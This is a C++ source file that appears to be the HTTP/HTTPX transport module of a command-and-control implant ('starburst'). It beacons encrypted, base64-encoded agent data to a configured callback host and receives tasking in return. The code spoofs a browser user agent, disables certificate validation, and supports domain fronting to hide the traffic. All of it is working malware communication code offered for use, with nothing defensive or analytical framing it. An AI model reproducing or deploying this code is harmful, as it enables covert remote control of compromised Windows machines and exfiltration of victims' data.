#include <common.h>
#include <transport_http.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )

using namespace stardust;
using namespace starburst;

auto declfn starburst::http_init(
    _Inout_ instance& inst
) -> bool {
    inst.h_session = inst.winhttp.WinHttpOpen(
        symbol<LPCWSTR>( L"Mozilla/5.0" ),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if ( !inst.h_session ) {
        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", inst.kernel32.GetLastError() );
        return false;
    }

    wchar_t wide_host[256] = { 0 };
    inst.kernel32.MultiByteToWideChar(
        CP_ACP, 0,
        inst.transport.callback_host, -1,
        wide_host, 256
    );

    inst.h_connect = inst.winhttp.WinHttpConnect(
        inst.h_session,
        wide_host,
        inst.transport.callback_port,
        0
    );

    if ( !inst.h_connect ) {
        DBG_PRINT( inst, "WinHttpConnect failed: %d\n", inst.kernel32.GetLastError() );
        return false;
    }

    DBG_PRINT( inst, "HTTP transport initialized -> %s:%d\n",
        inst.transport.callback_host, inst.transport.callback_port );

    return true;
}

auto declfn starburst::http_send(
    _Inout_ instance& inst,
    _In_    uint8_t*  data,
    _In_    uint32_t  len,
    _Out_   uint8_t** response,
    _Out_   uint32_t* resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    // encrypt the data
    uint8_t* encrypted = nullptr;
    uint32_t enc_len   = 0;

    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) ) {
        DBG_PRINT( inst, "crypto_encrypt failed\n" );
        return false;
    }

    // prepend UUID (36 bytes) + encrypted
    uint32_t uuid_len = str_len( inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) {
        inst.heap_free( encrypted );
        return false;
    }

    memory::copy( raw, inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    // base64 encode
    uint32_t b64_len = 0;
    auto b64_data = base64_encode( inst, raw, raw_len, &b64_len );
    inst.heap_free( raw );

    if ( !b64_data ) return false;

    // build URI
    wchar_t wide_uri[256] = { 0 };
    {
        char uri[256] = { 0 };
        uri[0] = '/';
        str_copy( uri + 1, inst.transport.post_uri );

        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, uri, -1, wide_uri, 256 );
    }

    DWORD flags = inst.transport.use_ssl ? WINHTTP_FLAG_SECURE : 0;

    HINTERNET h_request = inst.winhttp.WinHttpOpenRequest(
        inst.h_connect,
        symbol<LPCWSTR>( L"POST" ),
        wide_uri,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );

    if ( !h_request ) {
        DBG_PRINT( inst, "WinHttpOpenRequest failed: %d\n", inst.kernel32.GetLastError() );
        inst.heap_free( b64_data );
        return false;
    }

    // ignore cert errors for self-signed certs
    if ( inst.transport.use_ssl ) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        inst.winhttp.WinHttpSetOption( h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );
    }

#if defined( HTTPX_TRANSPORT )
    // apply custom headers from HTTPX profile
    if ( inst.transport.custom_headers_len > 0 ) {
        wchar_t wide_headers[1024] = { 0 };
        inst.kernel32.MultiByteToWideChar(
            CP_ACP, 0,
            inst.transport.custom_headers, -1,
            wide_headers, 1024
        );
        inst.winhttp.WinHttpAddRequestHeaders(
            h_request, wide_headers, -1,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
        );
    }

    // domain fronting: override Host header
    if ( inst.transport.domain_front[0] != '\0' ) {
        wchar_t wide_host_hdr[512] = { 0 };
        char host_hdr[512] = { 0 };
        str_copy( host_hdr, symbol<char*>( const_cast<char*>( "Host: " ) ) );
        str_concat( host_hdr, inst.transport.domain_front );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_hdr, -1, wide_host_hdr, 512 );
        inst.winhttp.WinHttpAddRequestHeaders(
            h_request, wide_host_hdr, -1,
            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
        );
    }
#endif

    BOOL sent = inst.winhttp.WinHttpSendRequest(
        h_request,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        b64_data, b64_len,
        b64_len,
        0
    );

    inst.heap_free( b64_data );

    if ( !sent ) {
        DBG_PRINT( inst, "WinHttpSendRequest failed: %d\n", inst.kernel32.GetLastError() );
        inst.winhttp.WinHttpCloseHandle( h_request );
        return false;
    }

    if ( !inst.winhttp.WinHttpReceiveResponse( h_request, nullptr ) ) {
        DBG_PRINT( inst, "WinHttpReceiveResponse failed: %d\n", inst.kernel32.GetLastError() );
        inst.winhttp.WinHttpCloseHandle( h_request );
        return false;
    }

    // read response body
    uint8_t* resp_buf  = nullptr;
    uint32_t resp_size = 0;
    uint32_t resp_cap  = 0;

    DWORD available = 0;
    DWORD read      = 0;

    while ( true ) {
        available = 0;
        if ( !inst.winhttp.WinHttpQueryDataAvailable( h_request, &available ) ) break;
        if ( available == 0 ) break;

        if ( resp_size + available > resp_cap ) {
            uint32_t new_cap = resp_cap == 0 ? 4096 : resp_cap;
            while ( new_cap < resp_size + available ) new_cap *= 2;
            resp_buf = static_cast<uint8_t*>( inst.heap_realloc( resp_buf, new_cap ) );
            resp_cap = new_cap;
        }

        read = 0;
        inst.winhttp.WinHttpReadData( h_request, resp_buf + resp_size, available, &read );
        resp_size += read;
    }

    inst.winhttp.WinHttpCloseHandle( h_request );

    if ( !resp_buf || resp_size == 0 ) return false;

    // base64 decode response
    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, resp_buf, resp_size, &decoded_len );
    inst.heap_free( resp_buf );

    if ( !decoded || decoded_len < 36 ) {
        if ( decoded ) inst.heap_free( decoded );
        return false;
    }

    // skip UUID prefix (36 bytes)
    uint8_t* cipher_data = decoded + 36;
    uint32_t cipher_len  = decoded_len - 36;

    // decrypt
    uint8_t* plain     = nullptr;
    uint32_t plain_len = 0;

    if ( !crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
        inst.heap_free( decoded );
        return false;
    }

    inst.heap_free( decoded );

    *response = plain;
    *resp_len = plain_len;

    return true;
}

auto declfn starburst::http_destroy(
    _Inout_ instance& inst
) -> void {
    if ( inst.h_connect ) {
        inst.winhttp.WinHttpCloseHandle( inst.h_connect );
        inst.h_connect = nullptr;
    }
    if ( inst.h_session ) {
        inst.winhttp.WinHttpCloseHandle( inst.h_session );
        inst.h_session = nullptr;
    }
}

#endif
